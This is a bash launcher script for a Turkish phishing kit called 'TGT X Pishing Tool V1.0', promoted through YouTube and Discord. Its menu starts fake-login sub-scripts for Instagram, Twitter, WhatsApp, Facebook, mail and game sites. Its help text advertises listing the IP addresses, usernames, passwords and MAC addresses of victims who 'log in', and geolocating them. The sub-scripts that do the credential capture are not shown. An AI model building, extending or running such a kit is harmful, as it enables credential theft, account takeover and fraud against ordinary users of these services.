#!/bin/bash
#!/bin/sh
#Turkish Guy Tim
clear
case $1 in

      "--help")
	   sleep 1
       echo -e "
--help & --h   (Yardım Menüsünü Çağırır)
--ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
--user         (Giriş Yapılmış Username & Pass)
--mac          (Giriş Yapanların Mac Adresleri)
--location     (Belirtilen Ip Adresinin Yer Tespiti)
bash TGTX.sh & sh TGTX.sh (Phishing Toolu 'nu Çalıştırır)
   "
  ;;

     "--h")
	   sleep 1
       echo -e "
--help & --h   (Yardım Menüsünü Çağırır)
--ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
--user         (Giriş Yapılmış Username & Pass)
--mac          (Giriş Yapanların Mac Adresleri)
--location     (Belirtilen Ip Adresinin Yer Tespiti)
bash TGTX.sh & sh TGTX.sh (Phishing Toolu 'nu Çalıştırır)"

  ;;

esac

banner(){
echo -e '\\e[31;40;1m 
  \e[31m
 _______________________  __   __
\e[31m |__   __/ __ _|__   __|  \ \ / /
\e[32m    | | | |  __   | |      \ V / 
\e[36m    | | | | |_ |  | |       > <   \e[37m  Main Menu
\e[34m    | | | |__| |  | |      / . \ 
\e[35m    |_|  \_____|  |_|     /_/ \_\
    \e[30m=============================                          
   \e[36m                                             İletişim && Sosyal Medya
   \e[31m                                         ###############################
       \e[37m      Coder:  Alyx   	            \e[31m| Youtube:  ♛\e[32m Turkish Guy Tim\e[31m ♛
    \e[31m     /♛ Turkish Guy Tim ♛\             \e[31m| Web Site: ♛\e[32m Turkish Guy Tim\e[31m ♛
                                            \e[31m| Discord:  ♛\e[32m  .gg/e8ruugKW\e[31m   ♛
       \e[33m TGT X Pishing Tool V1.0        \e[31m	    ###############################	 	
'
echo -e '
\e[31m===========================================|
|\e[31m[01]\e[32mİnstagram \e[31m| \e[31m[05]\e[32mFacebook              \e[31m|
|\e[31m[02]\e[32mTwitter   \e[31m| \e[31m[06]\e[32mMail                  \e[31m|
|\e[31m[03]\e[32mWhatsapp  \e[31m| \e[31m[07]\e[32mGames (Oyunlar)       \e[31m| 
|\e[31m[04]\e[32mOther                                 \e[31m| 
\e[31m===========================================|

\e[31m[00]\e[37m Code  \e[31m[99]\e[37m Exit (Çıkış)
\e[31m
'
read -p  "| Numara Seçiniz:" islem
}


banner
if [[ $islem == 1 || $islem == 01 ]]; then
	sleep 1
	clear
	cd Site/Instagram/
	bash instagram.sh

elif [[ $islem == 2 || $islem == 02 ]]; then
	sleep 1
	clear
	cd  Site/Twitter/
	bash Twitter.sh

elif [[ $islem == 3 || $islem == 03 ]]; then
	sleep 1
	clear
	cd Site/Whatsapp/
	bash Whatsapp.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
	sleep 1
	clear
	cd  Site/Others/
	bash Others.sh
	
elif [[ $islem == 5 || $islem == 05 ]]; then
	sleep 1
	clear
	cd  Site/Facebook/
	bash Facebook.sh

elif [[ $islem == 6 || $islem == 06 ]]; then
	sleep 1
	clear
	cd  Site/Mail/
	bash Mail.sh

elif [[ $islem == 7 || $islem == 07 ]]; then
	sleep 1
	clear
	cd  Site/Game/
	bash Game.sh
elif [[ $islem == 00 ]]; then

	cd Site/
	bash code.sh

elif [[ $islem == 99 ]]; then
	exit 1
else
	echo -e '\033[36;40;1m Lütfen Girdiğiniz İşlem Numarasını Kontrol Edin....'	
	sleep 1
	clear 
	banner
	bash tgtx.sh
fi
